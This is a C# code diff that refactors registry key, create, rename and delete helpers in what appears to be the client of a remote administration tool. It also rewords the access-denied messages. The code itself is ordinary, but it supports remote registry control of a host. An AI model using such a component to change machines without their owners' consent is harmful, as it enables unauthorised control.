@@ -49,13 +49,13 @@ namespace xClient.Core.Registry
             name = "";
             try
             {
-                RegistryKey parent = RegistrySeeker.GetWritableRegistryKey(parentPath);
+                RegistryKey parent = GetWritableRegistryKey(parentPath);
 
 
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running as administrator";
+                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -103,12 +103,12 @@ namespace xClient.Core.Registry
         {
             try
             {
-                RegistryKey parent = RegistrySeeker.GetWritableRegistryKey(parentPath);
+                RegistryKey parent = GetWritableRegistryKey(parentPath);
 
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running as administrator";
+                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -153,12 +153,12 @@ namespace xClient.Core.Registry
             try
             {
 
-                RegistryKey parent = RegistrySeeker.GetWritableRegistryKey(parentPath);
+                RegistryKey parent = GetWritableRegistryKey(parentPath);
 
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running as administrator";
+                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -207,12 +207,12 @@ namespace xClient.Core.Registry
             name = "";
             try
             {
-                RegistryKey key = RegistrySeeker.GetWritableRegistryKey(keyPath);
+                RegistryKey key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running as administrator";
+                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -259,12 +259,12 @@ namespace xClient.Core.Registry
         {
             try
             {
-                RegistryKey key = RegistrySeeker.GetWritableRegistryKey(keyPath);
+                RegistryKey key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running as administrator";
+                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -309,12 +309,12 @@ namespace xClient.Core.Registry
             try
             {
 
-                RegistryKey key = RegistrySeeker.GetWritableRegistryKey(keyPath);
+                RegistryKey key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running as administrator";
+                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -360,12 +360,12 @@ namespace xClient.Core.Registry
         {
             try
             {
-                RegistryKey key = RegistrySeeker.GetWritableRegistryKey(keyPath);
+                RegistryKey key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running as administrator";
+                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -398,5 +398,24 @@ namespace xClient.Core.Registry
         }
 
         #endregion
+
+        public static RegistryKey GetWritableRegistryKey(string keyPath)
+        {
+            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);
+
+            if (key != null)
+            {
+                //Check if this is a root key or not
+                if (key.Name != keyPath)
+                {
+                    //Must get the subKey name by removing root and '\\'
+                    string subKeyName = keyPath.Substring(key.Name.Length + 1);
+
+                    key = key.OpenWritableSubKeySafe(subKeyName);
+                }
+            }
+
+            return key;
+        }
     }
 }
